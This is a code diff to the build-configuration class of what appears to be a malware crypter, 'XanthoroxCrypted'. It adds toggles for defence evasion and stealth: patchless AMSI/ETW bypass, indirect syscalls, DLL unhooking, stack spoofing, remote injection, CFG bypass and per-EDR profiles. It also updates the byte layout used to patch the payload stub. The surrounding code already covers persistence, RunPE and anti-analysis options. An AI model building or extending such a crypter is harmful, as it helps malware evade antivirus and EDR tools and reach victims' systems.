@@ -15,71 +15,97 @@ namespace XanthoroxCrypted.Core
 {
     public class BuildConfig
     {
-        // Existing toggles (14)
+        public byte Version { get; set; } = 0x02;
+
         public bool AntiDebug { get; set; }
         public bool AntiVM { get; set; }
         public bool AntiSandbox { get; set; }
-        public bool AMSI { get; set; }
-        public bool ETW { get; set; }
+        public bool PatchlessAmsiEtw { get; set; }
         public bool Fibers { get; set; }
         public bool RunPE { get; set; }
         public bool ModuleStomp { get; set; }
         public bool Persist { get; set; }
         public bool Melt { get; set; }
         public bool FakeError { get; set; }
-        public bool SleepObf { get; set; }
+        public bool EkkoSleep { get; set; }
         public bool PPIDSpoof { get; set; }
         public bool EntropyNorm { get; set; }
-        // New toggles (6) — L11-L16
-        public bool Syscalls { get; set; }     // L11: Direct Syscalls
-        public bool ThreadPool { get; set; }   // L12: Thread Pool Execution
-        public bool GuardPage { get; set; }    // L14: Guard Page Payload Shield
-        public bool HWIDBind { get; set; }     // L15: HWID-Bound Key Derivation
-        public bool PhantomDLL { get; set; }   // L16: Phantom DLL Hollowing
-        public bool CallbackDiv { get; set; }  // Callback Diversification
-        // L21-L40 toggles
-        public bool MotwStrip { get; set; }     // L21
-        public bool AntiEmulation { get; set; } // L22
-        public bool StagedLoad { get; set; }    // L39
-        // Builder-only toggles (not sent to stub config)
-        public bool Inflate { get; set; }       // L27: Binary Inflation
-        public bool SectionMerge { get; set; }  // L33: Section Merging
-        public bool OverlayMode { get; set; }   // L30: PE Overlay Smuggling
-        // Remaining
+        public bool IndirectSyscalls { get; set; }
+        public bool ThreadPool { get; set; }
+        public bool GuardPage { get; set; }
+        public bool HWIDBind { get; set; }
+        public bool PhantomDLL { get; set; }
+        public bool CallbackDiv { get; set; }
+        public bool MotwStrip { get; set; }
+        public bool AntiEmulation { get; set; }
+        public bool StagedLoad { get; set; }
+
+        public bool KnownDllsUnhook { get; set; }
+        public bool StackSpoof { get; set; }
+        public bool AntiMemScan { get; set; }
+        public bool RemoteInjection { get; set; }
+        public bool DotNetLoading { get; set; }
+        public bool ThreadNormalization { get; set; }
+        public bool SideloadFormat { get; set; }
+        public bool BuildRandomization { get; set; }
+        public bool AntiDump { get; set; }
+        public bool CfgBypass { get; set; }
+        public bool DllUnlink { get; set; }
+        public bool PerEdrProfile { get; set; }
+        public bool StagedDelivery { get; set; }
+
+        public byte SideloadFormatType { get; set; }
         public byte EncAlgorithm { get; set; }
-        public byte ResearchPackage { get; set; }  // 0=None, 1=Ghost, 2=Neuro, 3=Darknet
+        public byte ResearchPackage { get; set; }
+
+        // Builder-only toggles (not in StubConfig)
+        public bool Inflate { get; set; }
+        public bool SectionMerge { get; set; }
+        public bool OverlayMode { get; set; }
 
         public byte[] ToBytes()
         {
-            // Must match StubConfig layout in Entry.cpp exactly
-            // 23 bools + 1 encAlgorithm + 1 researchPackage + 7 padding = 32 bytes
-            byte[] config = new byte[32];
-            config[0]  = AntiDebug   ? (byte)1 : (byte)0;
-            config[1]  = AntiVM      ? (byte)1 : (byte)0;
-            config[2]  = AntiSandbox ? (byte)1 : (byte)0;
-            config[3]  = AMSI        ? (byte)1 : (byte)0;
-            config[4]  = ETW         ? (byte)1 : (byte)0;
-            config[5]  = Fibers      ? (byte)1 : (byte)0;
-            config[6]  = RunPE       ? (byte)1 : (byte)0;
-            config[7]  = ModuleStomp ? (byte)1 : (byte)0;
-            config[8]  = Persist     ? (byte)1 : (byte)0;
-            config[9]  = Melt        ? (byte)1 : (byte)0;
-            config[10] = FakeError   ? (byte)1 : (byte)0;
-            config[11] = SleepObf    ? (byte)1 : (byte)0;
-            config[12] = PPIDSpoof   ? (byte)1 : (byte)0;
-            config[13] = EntropyNorm ? (byte)1 : (byte)0;
-            config[14] = Syscalls    ? (byte)1 : (byte)0;
-            config[15] = ThreadPool  ? (byte)1 : (byte)0;
-            config[16] = GuardPage   ? (byte)1 : (byte)0;
-            config[17] = HWIDBind    ? (byte)1 : (byte)0;
-            config[18] = PhantomDLL  ? (byte)1 : (byte)0;
-            config[19] = CallbackDiv ? (byte)1 : (byte)0;
-            config[20] = MotwStrip   ? (byte)1 : (byte)0;
-            config[21] = AntiEmulation ? (byte)1 : (byte)0;
-            config[22] = StagedLoad  ? (byte)1 : (byte)0;
-            config[23] = EncAlgorithm;
-            config[24] = ResearchPackage;
-            // bytes 25-31 = padding (zeroed by default)
+            byte[] config = new byte[44];
+            config[0]  = Version;
+            config[1]  = AntiDebug        ? (byte)1 : (byte)0;
+            config[2]  = AntiVM           ? (byte)1 : (byte)0;
+            config[3]  = AntiSandbox      ? (byte)1 : (byte)0;
+            config[4]  = PatchlessAmsiEtw ? (byte)1 : (byte)0;
+            config[5]  = Fibers          ? (byte)1 : (byte)0;
+            config[6]  = RunPE           ? (byte)1 : (byte)0;
+            config[7]  = ModuleStomp     ? (byte)1 : (byte)0;
+            config[8]  = Persist         ? (byte)1 : (byte)0;
+            config[9]  = Melt            ? (byte)1 : (byte)0;
+            config[10] = FakeError       ? (byte)1 : (byte)0;
+            config[11] = EkkoSleep       ? (byte)1 : (byte)0;
+            config[12] = PPIDSpoof       ? (byte)1 : (byte)0;
+            config[13] = EntropyNorm     ? (byte)1 : (byte)0;
+            config[14] = IndirectSyscalls ? (byte)1 : (byte)0;
+            config[15] = ThreadPool      ? (byte)1 : (byte)0;
+            config[16] = GuardPage       ? (byte)1 : (byte)0;
+            config[17] = HWIDBind        ? (byte)1 : (byte)0;
+            config[18] = PhantomDLL      ? (byte)1 : (byte)0;
+            config[19] = CallbackDiv     ? (byte)1 : (byte)0;
+            config[20] = MotwStrip       ? (byte)1 : (byte)0;
+            config[21] = AntiEmulation   ? (byte)1 : (byte)0;
+            config[22] = StagedLoad      ? (byte)1 : (byte)0;
+            config[23] = KnownDllsUnhook ? (byte)1 : (byte)0;
+            config[24] = StackSpoof      ? (byte)1 : (byte)0;
+            config[25] = AntiMemScan     ? (byte)1 : (byte)0;
+            config[26] = RemoteInjection ? (byte)1 : (byte)0;
+            config[27] = DotNetLoading   ? (byte)1 : (byte)0;
+            config[28] = ThreadNormalization ? (byte)1 : (byte)0;
+            config[29] = SideloadFormat  ? (byte)1 : (byte)0;
+            config[30] = BuildRandomization ? (byte)1 : (byte)0;
+            config[31] = AntiDump        ? (byte)1 : (byte)0;
+            config[32] = CfgBypass       ? (byte)1 : (byte)0;
+            config[33] = DllUnlink       ? (byte)1 : (byte)0;
+            config[34] = PerEdrProfile   ? (byte)1 : (byte)0;
+            config[35] = StagedDelivery  ? (byte)1 : (byte)0;
+            config[36] = SideloadFormatType;
+            config[37] = EncAlgorithm;
+            config[38] = ResearchPackage;
+            // bytes 39-43 = padding (zeroed)
             return config;
         }
     }
@@ -90,6 +116,8 @@ namespace XanthoroxCrypted.Core
         private static readonly byte[] MARKER_KEY      = Encoding.ASCII.GetBytes("XKEYBLK");
         private static readonly byte[] MARKER_PAYLOAD  = Encoding.ASCII.GetBytes("XPAYLOD");
         private static readonly byte[] MARKER_RESEARCH = Encoding.ASCII.GetBytes("XRESRC\0");
+        private static readonly byte[] MARKER_SPOOF  = Encoding.ASCII.GetBytes("XSPOOF");
+        private static readonly byte[] MARKER_GADGET = Encoding.ASCII.GetBytes("XGADGT");
 
         public static string Build(string stubPath, string outputPath, byte[] payload,
             byte[] key, BuildConfig config, byte[]? researchParams = null)
@@ -147,7 +175,7 @@ namespace XanthoroxCrypted.Core
             // Multiple mutations can corrupt patched data (EqualizeEntropy,
             // EncryptStringTable, InjectResourceMimicry, etc.)
             // We save the raw bytes now and restore them after Mutate().
-            int configRegionLen = 8 + 32; // marker(7)+gap(1) + config(32)
+            int configRegionLen = 8 + 44; // marker(7)+gap(1) + config(44)
             byte[] savedConfig = new byte[configRegionLen];
             Array.Copy(stubData, configOffset, savedConfig, 0, configRegionLen);
 
